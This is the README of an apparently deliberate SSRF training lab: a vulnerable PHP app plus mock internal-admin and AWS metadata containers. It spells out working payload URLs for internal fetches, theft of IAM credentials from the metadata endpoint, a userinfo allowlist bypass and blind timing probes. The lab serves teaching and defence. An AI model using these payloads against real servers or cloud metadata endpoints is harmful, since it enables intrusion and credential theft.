# ssrf-basic

The companion lab for TechEarl's SSRF article. A small PHP app exposing three "fetch a URL on the server's behalf" features, each broken in a different realistic way. The lab ships with two extra containers on the Docker network (a mock internal admin service and a mock AWS IMDSv1 endpoint) as the exfiltration targets.

## Topology

| Service | Role | Exposed |
|---|---|---|
| `ssrf-basic` | Vulnerable public-facing PHP app | `127.0.0.1:8082` |
| `ssrf-basic-internal` | Mock internal admin panel | Docker network only |
| `ssrf-basic-metadata` | Mock AWS IMDSv1 (`169.254.169.254` equivalent) | Docker network only |

The two backend services have no published ports. You can only reach them by routing the request through the SSRF in `ssrf-basic`, which is the whole point of the lab.

## Running

```bash
docker compose up ssrf-basic ssrf-basic-internal ssrf-basic-metadata
```

From the **root** of the `techearl-labs` repo. Lab listens on `http://localhost:8082`.

## Expected exploit paths

The article walks all four. Every URL below assumes the lab is up at `http://localhost:8082`.

### 1. Basic SSRF to internal service

```
http://localhost:8082/fetch.php?url=http://ssrf-basic-internal/
```

`/fetch.php` passes `$_GET['url']` straight to `file_get_contents`. The response from the internal admin panel comes back inline, demonstrating that the perimeter is meaningless once the server is the one making the request.

### 2. Cloud metadata theft (AWS IMDSv1)

```
http://localhost:8082/fetch.php?url=http://ssrf-basic-metadata/latest/meta-data/iam/security-credentials/role-name
```

Returns the (fake) IAM credential blob. In production this is `http://169.254.169.254/...`; the lab substitutes a Docker-network hostname because containers cannot bind to link-local addresses. The article shows the real and lab URLs side by side.

### 3. Naive allowlist bypass (userinfo trick)

```
http://localhost:8082/fetch-allowlist.php?url=http://example.com@ssrf-basic-internal/
```

`/fetch-allowlist.php` checks `parse_url($url)['host']` against `['example.com', 'api.example.com']`. With the `user@host` URL form, `parse_url` reports the host as `example.com` (the segment before `@`), but `file_get_contents` sends the request to the real authority, `ssrf-basic-internal`. Allowlist passes; the fetch lands on the internal target.

### 4. Blind SSRF via response-time inference

```
# Reachable internal host: returns "OK" in a few milliseconds
http://localhost:8082/fetch-blind.php?url=http://ssrf-basic-internal/

# Non-routable address: hangs until the 5-second timeout fires
http://localhost:8082/fetch-blind.php?url=http://10.255.255.1/
```

`/fetch-blind.php` discards the response body and returns only "OK" or "Timeout". The two URLs above show the timing oracle: reachable hosts come back fast, dropped hosts hit the timeout. Sweeping through internal IP ranges and ports against this oracle is how blind SSRF gets mapped in the wild.

## Verifying it is up

```bash
# Landing page renders
curl -s http://localhost:8082/ | grep -c 'ssrf-basic'

# Basic SSRF reaches the internal service
curl -s 'http://localhost:8082/fetch.php?url=http://ssrf-basic-internal/' | grep -c 'internal admin panel'

# Metadata exfil works
curl -s 'http://localhost:8082/fetch.php?url=http://ssrf-basic-metadata/latest/meta-data/iam/security-credentials/role-name' | grep -c 'AKIAIOSFODNN7EXAMPLE'
```

All three should report `1` or higher. If they do, every exploit path above is reachable and the lab is wired correctly.

## Tearing down

```bash
docker compose down
```

No persistent state in this lab (no database, no volumes), so a plain `down` is enough between runs.

## Safety

Bound to `127.0.0.1` by default. Do not expose this container to a public interface. The backend `ssrf-basic-internal` and `ssrf-basic-metadata` containers have no published ports on purpose; do not add any. The IAM credential blob served by the metadata mock is a documented AWS example value (`AKIAIOSFODNN7EXAMPLE`), not a real key, but treat the pattern as if it were: never let a service that fetches arbitrary URLs near a real cloud-metadata endpoint without IMDSv2, hop-limit, and a default-deny egress policy in front of it.
